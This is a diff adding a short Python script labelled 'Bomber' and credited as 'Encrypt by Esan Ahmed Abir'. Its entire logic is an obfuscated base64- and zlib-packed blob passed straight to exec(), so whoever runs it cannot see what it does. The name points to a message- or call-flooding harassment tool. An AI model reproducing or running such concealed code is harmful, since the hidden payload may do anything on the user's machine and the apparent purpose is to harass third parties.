@@ -1,0 +1,6 @@
+#Encrypt by Esan Ahmed Abir
+#Bomber
+#
+
+import marshal,zlib,base64
+exec(zlib.decompress(base64.b64decode("eJzFj70OwjAMhGfyFBEDP0OThYkNJB4kKW5jkT9sV6hvD0UCAWJhYjudT/f5MNVCogsrfChTnQSlsHtog9xhhNXS7DxS40vyQKaOy/VWzW4ZHlkgreb11GvMLC5GfelBdDPO1+8JrM8EwXkAFtaLhX71PW8mq43gaBKUdEOd/mBPlzsjiFTeWkvuYnqUMPiBgdqSBbKYtiR7YJd3IcFxarD7e4NNDrP90vnE1lFCyZ/Y2x4FkeHX4f959QrSTqKQ")))
